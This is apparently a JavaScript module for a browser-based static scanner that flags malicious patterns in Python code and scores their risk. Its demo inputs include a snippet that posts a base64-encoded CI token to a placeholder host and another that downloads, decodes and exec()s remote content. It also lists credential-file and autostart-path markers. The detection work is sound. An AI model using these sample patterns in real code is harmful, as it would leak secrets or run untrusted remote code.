import {
  getFullModelStatus,
  installFullModel,
  loadFullModel,
  predictMicro,
  unloadFullModel,
} from "./full-model-runtime.mjs";

export {
  getFullModelStatus,
  installFullModel,
  loadFullModel,
  predictMicro,
  unloadFullModel,
};

export const MAX_SOURCE_BYTES = 1_000_000;

export const DEMO_SOURCES = Object.freeze({
  benign: `from pathlib import Path
import json

def load_settings(path: str) -> dict:
    text = Path(path).read_text(encoding="utf-8")
    return json.loads(text)
`,
  suspicious: `import base64
import os
import requests as http

def collect():
    token = os.getenv("CI_TOKEN")
    packed = base64.b64encode(token.encode())
    http.post("https://example.invalid/collect", data=packed)
`,
  download: `import base64
import requests

def update():
    payload = requests.get("https://example.invalid/stage").content
    decoded = base64.b64decode(payload)
    exec(decoded)
`,
});

const EVENT_WEIGHTS = Object.freeze({
  DYNAMIC_EXEC: 27,
  PROCESS_EXEC: 18,
  UNSAFE_DESERIALIZE: 17,
  NETWORK_SEND: 15,
  NETWORK_RECEIVE: 7,
  PERSISTENCE_WRITE: 24,
  SENSITIVE_FILE_READ: 12,
  ENV_READ: 7,
  SYSTEM_DISCOVERY: 5,
  DYNAMIC_IMPORT: 7,
  DECODE: 7,
  ENCODE: 4,
  FILE_DELETE: 10,
  FILE_WRITE: 1,
});

const CALL_RULES = Object.freeze([
  {
    names: new Set([
      "eval",
      "builtins.eval",
      "exec",
      "builtins.exec",
      "compile",
      "builtins.compile",
    ]),
    op: "DYNAMIC_EXEC",
    category: "sink",
    detail: "dynamic code execution",
  },
  {
    names: new Set([
      "__import__",
      "builtins.__import__",
      "importlib.import_module",
    ]),
    op: "DYNAMIC_IMPORT",
    category: "transform",
    detail: "dynamic module loading",
  },
  {
    names: new Set([
      "subprocess.run",
      "subprocess.call",
      "subprocess.check_call",
      "subprocess.check_output",
      "subprocess.Popen",
      "os.system",
      "os.popen",
      "commands.getoutput",
    ]),
    op: "PROCESS_EXEC",
    category: "sink",
    detail: "process or shell execution",
  },
  {
    names: new Set([
      "requests.post",
      "requests.put",
      "requests.patch",
      "requests.Session.post",
      "requests.Session.put",
      "httpx.post",
      "httpx.put",
      "httpx.Client.post",
      "httpx.Client.put",
      "aiohttp.ClientSession.post",
      "urllib.request.urlopen",
      "socket.socket.send",
      "socket.socket.sendall",
    ]),
    op: "NETWORK_SEND",
    category: "sink",
    detail: "outbound data transfer",
  },
  {
    names: new Set([
      "requests.get",
      "requests.Session.get",
      "httpx.get",
      "httpx.Client.get",
      "aiohttp.ClientSession.get",
      "urllib.request.urlretrieve",
      "socket.create_connection",
      "socket.socket.connect",
    ]),
    op: "NETWORK_RECEIVE",
    category: "source",
    detail: "remote communication",
  },
  {
    names: new Set(["os.getenv", "os.environ.get"]),
    op: "ENV_READ",
    category: "source",
    detail: "environment variable access",
  },
  {
    names: new Set([
      "base64.b64decode",
      "base64.urlsafe_b64decode",
      "binascii.unhexlify",
      "codecs.decode",
      "zlib.decompress",
      "gzip.decompress",
      "bz2.decompress",
      "lzma.decompress",
    ]),
    op: "DECODE",
    category: "transform",
    detail: "encoded or compressed data decoding",
  },
  {
    names: new Set([
      "base64.b64encode",
      "base64.urlsafe_b64encode",
      "binascii.hexlify",
      "zlib.compress",
      "gzip.compress",
    ]),
    op: "ENCODE",
    category: "transform",
    detail: "data encoding or compression",
  },
  {
    names: new Set([
      "pickle.loads",
      "marshal.loads",
      "yaml.load",
      "dill.loads",
      "cloudpickle.loads",
    ]),
    op: "UNSAFE_DESERIALIZE",
    category: "sink",
    detail: "potentially unsafe deserialization",
  },
  {
    names: new Set([
      "os.remove",
      "os.unlink",
      "os.rmdir",
      "shutil.rmtree",
      "pathlib.Path.unlink",
      "pathlib.Path.rmdir",
    ]),
    op: "FILE_DELETE",
    category: "sink",
    detail: "file or directory deletion",
  },
  {
    names: new Set([
      "platform.platform",
      "platform.uname",
      "platform.node",
      "socket.gethostname",
      "getpass.getuser",
      "os.getuid",
    ]),
    op: "SYSTEM_DISCOVERY",
    category: "source",
    detail: "host or user discovery",
  },
]);

const SENSITIVE_MARKERS = Object.freeze([
  ".ssh",
  "id_rsa",
  "id_ed25519",
  ".aws",
  "credentials",
  ".config/gcloud",
  ".azure",
  ".npmrc",
  ".pypirc",
  ".netrc",
  "wallet",
  "cookies",
  "login data",
  "history",
  "/etc/passwd",
  "/etc/shadow",
  "token",
]);

const PERSISTENCE_MARKERS = Object.freeze([
  ".bashrc",
  ".zshrc",
  ".profile",
  "crontab",
  "/cron.",
  "systemd",
  "startup",
  "launchagents",
  "launchdaemons",
  "sitecustomize.py",
]);

const SOURCE_OPS = new Set([
  "ENV_READ",
  "SENSITIVE_FILE_READ",
  "FILE_READ",
  "SYSTEM_DISCOVERY",
  "NETWORK_RECEIVE",
]);
const TRANSFORM_OPS = new Set(["ENCODE", "DECODE", "UNSAFE_DESERIALIZE"]);
const EXECUTION_SINKS = new Set(["DYNAMIC_EXEC", "PROCESS_EXEC"]);
const INSTALL_NAMES = new Set([
  "setup",
  "install",
  "post_install",
  "build",
  "develop",
]);

function containsMarker(value, markers) {
  const normalized = String(value || "")
    .toLowerCase()
    .replaceAll("\\", "/");
  return markers.some((marker) => normalized.includes(marker));
}

function isPersistencePath(value) {
  const normalized = String(value || "")
    .toLowerCase()
    .replaceAll("\\", "/");
  if (PERSISTENCE_MARKERS.some((marker) => normalized.includes(marker))) {
    return true;
  }
  return (normalized.split("/").at(-1) || "").endsWith(".pth");
}

function resolveName(name, aliases) {
  const pieces = name.split(".");
  const resolved = aliases.get(pieces[0]);
  return resolved ? [resolved, ...pieces.slice(1)].join(".") : name;
}

function classifyCall(name, hasPayload) {
  for (const rule of CALL_RULES) {
    if (rule.names.has(name)) {
      if (name === "urllib.request.urlopen" && !hasPayload) {
        return {
          op: "NETWORK_RECEIVE",
          category: "source",
          detail: "remote communication",
        };
      }
      return rule;
    }
  }
  if (
    name.startsWith("subprocess.") ||
    name.startsWith("os.spawn") ||
    name.startsWith("os.exec")
  ) {
    return {
      op: "PROCESS_EXEC",
      category: "sink",
      detail: "process or shell execution",
    };
  }
  if (
    ["read", "read_text", "read_bytes"].includes(name) ||
    /\.(read|read_text|read_bytes)$/.test(name)
  ) {
    return { op: "FILE_READ", category: "source", detail: "file read" };
  }
  if (
    ["write", "write_text", "write_bytes"].includes(name) ||
    /\.(write|write_text|write_bytes)$/.test(name)
  ) {
    return { op: "FILE_WRITE", category: "sink", detail: "file write" };
  }
  return null;
}

function maskRange(characters, start, end) {
  for (let index = start; index < end; index += 1) {
    characters[index] = " ";
  }
}

function lexLine(line, state) {
  const characters = [...line];
  const literals = [];
  let index = 0;
  while (index < line.length) {
    if (state.triple) {
      const end = line.indexOf(state.triple, index);
      if (end === -1) {
        maskRange(characters, index, line.length);
        return { code: characters.join(""), literals };
      }
      maskRange(characters, index, end + 3);
      index = end + 3;
      state.triple = null;
      continue;
    }
    if (line[index] === "#") {
      maskRange(characters, index, line.length);
      break;
    }
    if (line[index] !== "'" && line[index] !== '"') {
      index += 1;
      continue;
    }
    const quote = line[index];
    const triple = quote.repeat(3);
    if (line.slice(index, index + 3) === triple) {
      const end = line.indexOf(triple, index + 3);
      if (end === -1) {
        state.triple = triple;
        maskRange(characters, index, line.length);
        break;
      }
      literals.push(line.slice(index + 3, end));
      maskRange(characters, index, end + 3);
      index = end + 3;
      continue;
    }
    let end = index + 1;
    let value = "";
    while (end < line.length) {
      if (line[end] === "\\" && end + 1 < line.length) {
        value += line[end + 1];
        end += 2;
        continue;
      }
      if (line[end] === quote) {
        break;
      }
      value += line[end];
      end += 1;
    }
    const stop = Math.min(line.length, end + 1);
    literals.push(value);
    maskRange(characters, index, stop);
    index = stop;
  }
  return { code: characters.join(""), literals };
}

function indentation(line) {
  const prefix = line.match(/^[ \t]*/)?.[0] || "";
  return [...prefix].reduce(
    (size, character) => size + (character === "\t" ? 4 : 1),
    0,
  );
}

function phaseFor(fileName, functions) {
  const current = functions.at(-1)?.name || "<module>";
  const baseName = fileName.split(/[\\/]/).at(-1)?.toLowerCase() || fileName;
  if (
    (baseName === "setup.py" && functions.length === 0) ||
    INSTALL_NAMES.has(current)
  ) {
    return "install";
  }
  return functions.length === 0 ? "import" : "runtime";
}

function firstTarget(literals, fallback) {
  return (literals.find((value) => value.length > 0) || fallback).slice(0, 240);
}

function extractEvents(source, fileName) {
  const aliases = new Map();
  const functions = [];
  const events = [];
  const seen = new Set();
  const lexState = { triple: null };

  const add = (pending, event) => {
    const key = [event.op, event.line, event.target, event.function].join("|");
    if (!seen.has(key)) {
      seen.add(key);
      pending.push(event);
    }
  };

  source.split(/\r?\n/).forEach((line, zeroIndex) => {
    const lineNumber = zeroIndex + 1;
    const { code, literals } = lexLine(line, lexState);
    const trimmed = code.trim();
    if (!trimmed) {
      return;
    }

    const indent = indentation(code);
    while (functions.length && indent <= functions.at(-1).indent) {
      functions.pop();
    }
    const definition = trimmed.match(/^(?:async\s+)?def\s+([A-Za-z_]\w*)\s*\(/);
    if (definition) {
      functions.push({ name: definition[1], indent });
    }
    const functionName = functions.at(-1)?.name || "<module>";
    const phase = phaseFor(fileName, functions);
    const pending = [];

    const importMatch = trimmed.match(/^import\s+(.+)$/);
    if (importMatch) {
      for (const entry of importMatch[1].split(",")) {
        const parsed = entry
          .trim()
          .match(
            /^([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)(?:\s+as\s+([A-Za-z_]\w*))?$/,
          );
        if (!parsed) continue;
        const moduleName = parsed[1];
        aliases.set(parsed[2] || moduleName.split(".")[0], moduleName);
        add(pending, {
          op: "IMPORT",
          category: "context",
          target: moduleName,
          line: lineNumber,
          column: code.indexOf(moduleName),
          function: functionName,
          phase,
          detail: "module import",
        });
      }
    }

    const fromMatch = trimmed.match(
      /^from\s+([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)\s+import\s+(.+)$/,
    );
    if (fromMatch) {
      for (const entry of fromMatch[2].split(",")) {
        const parsed = entry
          .trim()
          .match(/^([A-Za-z_]\w*)(?:\s+as\s+([A-Za-z_]\w*))?$/);
        if (!parsed) continue;
        const fullName = `${fromMatch[1]}.${parsed[1]}`;
        aliases.set(parsed[2] || parsed[1], fullName);
        add(pending, {
          op: "IMPORT",
          category: "context",
          target: fullName,
          line: lineNumber,
          column: code.indexOf(parsed[1]),
          function: functionName,
          phase,
          detail: "symbol import",
        });
      }
    }

    const assignment = trimmed.match(
      /^([A-Za-z_]\w*)\s*=\s*([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)+)\s*(?:\(|$)/,
    );
    if (assignment) {
      const qualified = resolveName(assignment[2], aliases);
      aliases.set(assignment[1], qualified);
    }

    const environPattern = /\b(?:os\.)?environ\s*\[/g;
    for (const match of code.matchAll(environPattern)) {
      add(pending, {
        op: "ENV_READ",
        category: "source",
        target: firstTarget(literals, "environment"),
        line: lineNumber,
        column: match.index || 0,
        function: functionName,
        phase,
        detail: "environment variable access",
      });
    }

    const calls = [
      ...code.matchAll(/\b([A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*)\s*\(/g),
    ].sort((left, right) => (right.index || 0) - (left.index || 0));
    for (const match of calls) {
      const rawName = match[1];
      const name = resolveName(rawName, aliases);
      const hasPayload = /\b(data|json|files|content)\s*=/.test(code);
      let classified;
      let target = firstTarget(literals, name);

      if (["open", "builtins.open", "io.open"].includes(name)) {
        const mode =
          literals.find(
            (value, index) => index > 0 && /^[rwaxtb+]+$/.test(value),
          ) || "r";
        const write = /[wax+]/.test(mode);
        classified = write
          ? { op: "FILE_WRITE", category: "sink", detail: "file write" }
          : { op: "FILE_READ", category: "source", detail: "file read" };
      } else {
        classified = classifyCall(name, hasPayload);
      }
      if (!classified) continue;

      if (
        classified.op === "FILE_WRITE" &&
        ["write", "write_text", "write_bytes"].includes(name.split(".").at(-1))
      ) {
        target = name;
      }
      if (
        classified.op === "FILE_READ" &&
        containsMarker(target, SENSITIVE_MARKERS)
      ) {
        classified = {
          op: "SENSITIVE_FILE_READ",
          category: "source",
          detail: "sensitive file access",
        };
      }
      if (
        classified.op === "FILE_WRITE" &&
        isPersistencePath(target)
      ) {
        classified = {
          op: "PERSISTENCE_WRITE",
          category: "sink",
          detail: "autostart location write",
        };
      }
      add(pending, {
        ...classified,
        target,
        line: lineNumber,
        column: match.index || 0,
        function: functionName,
        phase,
      });
    }
    pending.sort((left, right) => right.column - left.column);
    events.push(...pending);
  });
  return events.slice(0, 2000);
}

function buildMotifs(events, windowSize = 12) {
  const groups = new Map();
  events.forEach((event, index) => {
    const key = event.function;
    if (!groups.has(key)) groups.set(key, []);
    groups.get(key).push({ index, event });
  });
  const motifs = [];
  const seen = new Set();

  const append = (
    motif,
    score,
    reason,
    indexes,
    evidenceKind = "proximity",
    confidence = "low",
  ) => {
    const key = `${motif}:${indexes.join(",")}`;
    if (seen.has(key)) return;
    seen.add(key);
    motifs.push({
      motif,
      score,
      reason,
      eventIndexes: indexes,
      evidenceKind,
      confidence,
    });
  };

  for (const group of groups.values()) {
    group.forEach(({ index: sinkIndex, event: sink }, offset) => {
      const earlier = group.slice(Math.max(0, offset - windowSize), offset);
      const sources = earlier.filter(({ event }) => SOURCE_OPS.has(event.op));
      const transforms = earlier.filter(({ event }) =>
        TRANSFORM_OPS.has(event.op),
      );

      if (sink.op === "NETWORK_SEND") {
        for (const source of sources.slice(-2)) {
          if (["ENV_READ", "SENSITIVE_FILE_READ"].includes(source.event.op)) {
            append(
              "credential_or_file_exfil",
              2,
              "sensitive source appears near an outbound transfer; browser value flow was not proven",
              [source.index, sinkIndex],
            );
          } else if (source.event.op === "SYSTEM_DISCOVERY") {
            append(
              "fingerprinting_transfer",
              2,
              "host discovery appears near an outbound transfer; browser value flow was not proven",
              [source.index, sinkIndex],
            );
          } else if (source.event.op === "FILE_READ") {
            append(
              "file_to_network",
              1,
              "file read appears near an outbound transfer; browser value flow was not proven",
              [source.index, sinkIndex],
            );
          }
        }
      }

      if (EXECUTION_SINKS.has(sink.op)) {
        const remote = sources.filter(
          ({ event }) => event.op === "NETWORK_RECEIVE",
        );
        if (remote.length) {
          append(
            "download_execute",
            4,
            "remote input appears near execution; browser value flow was not proven",
            [remote.at(-1).index, sinkIndex],
          );
        }
        if (transforms.length) {
          append(
            "encoded_execution",
            6,
            "decoded or deserialized data appears near execution; browser value flow was not proven",
            [transforms.at(-1).index, sinkIndex],
          );
        }
        if (sink.phase === "install") {
          append(
            "install_time_execution",
            30,
            "execution occurs during package installation",
            [sinkIndex],
            "structural",
            "high",
          );
        }
      }

      if (sink.op === "PERSISTENCE_WRITE") {
        append(
          "persistence_write",
          34,
          "code writes to a common autostart location",
          [sinkIndex],
          "structural",
          "high",
        );
      }
      if (sink.op === "FILE_DELETE") {
        append(
          "destructive_file_action",
          18,
          "code deletes a file or directory",
          [sinkIndex],
          "structural",
          "high",
        );
      }
    });
  }
  return motifs.sort((left, right) => right.score - left.score);
}

function canonicalTokens(events, motifs, fileName) {
  const tokens = [`FILE:${fileName}`];
  for (const event of events) {
    const target = String(event.target || "unknown")
      .toLowerCase()
      .replaceAll(" ", "_");
    tokens.push(
      `P:${event.phase}|C:${event.category}|O:${event.op}|T:${target}`,
    );
  }
  tokens.push(...motifs.map((motif) => `MOTIF:${motif.motif}`));
  return tokens;
}

function verdictFor(score) {
  if (score >= 75) return "high-risk";
  if (score >= 50) return "suspicious";
  if (score >= 25) return "review";
  return "low-signal";
}

function assessmentFor(verdict) {
  if (verdict === "low-signal") return "no-malware-evidence";
  if (verdict === "review") return "needs-review";
  return "malware-like";
}

export function analyzeSource(source, fileName = "sample.py") {
  const started = globalThis.performance?.now?.() ?? Date.now();
  if (typeof source !== "string") {
    throw new TypeError("source must be text");
  }
  const bytes = new TextEncoder().encode(source).length;
  if (bytes > MAX_SOURCE_BYTES) {
    throw new RangeError("File exceeds the 1 MB browser analysis limit.");
  }

  const events = extractEvents(source, fileName);
  const motifs = buildMotifs(events);
  const evidence = [];

  for (const event of events) {
    const score = EVENT_WEIGHTS[event.op] || 0;
    if (score) {
      evidence.push({
        score,
        reason: event.detail,
        path: fileName,
        line: event.line,
        op: event.op,
        motif: null,
      });
    }
  }
  for (const motif of motifs) {
    const first = events[motif.eventIndexes[0]];
    evidence.push({
      score: motif.score,
      reason: motif.reason,
      path: fileName,
      line: first?.line || 0,
      op: "BEHAVIOR_PATH",
      motif: motif.motif,
      evidenceKind: motif.evidenceKind,
      confidence: motif.confidence,
    });
  }
  evidence.sort(
    (left, right) =>
      right.score - left.score ||
      left.line - right.line ||
      left.op.localeCompare(right.op),
  );

  const ruleScore = Math.min(
    100,
    evidence.slice(0, 8).reduce((total, item) => total + item.score, 0),
  );
  const modelStatus = getFullModelStatus();
  const modelUsed =
    modelStatus.loaded && ruleScore >= 20 && ruleScore <= 80;
  const modelTokens = canonicalTokens(events, motifs, fileName);
  const modelProbability = modelUsed ? predictMicro(modelTokens) : null;
  const riskScore = modelUsed
    ? 100 * (0.65 * (ruleScore / 100) + 0.35 * modelProbability)
    : ruleScore;
  const verdict = verdictFor(riskScore);
  const ended = globalThis.performance?.now?.() ?? Date.now();

  return {
    schema: "itcs.browser-scan.v1",
    target: fileName,
    assessment: assessmentFor(verdict),
    verdict,
    riskScore,
    ruleScore,
    bytes,
    elapsedMs: ended - started,
    evidence: evidence.slice(0, 12),
    events,
    motifs,
    modelTokens,
    model: {
      loaded: modelStatus.loaded,
      used: modelUsed,
      probability: modelProbability,
      metadata: modelStatus.metadata,
    },
    warnings: [
      "Browser demo uses the MalIR-Lite lexical frontend; install the Python CLI for AST-accurate analysis.",
      "A low-signal result is not proof that code is safe.",
    ],
  };
}
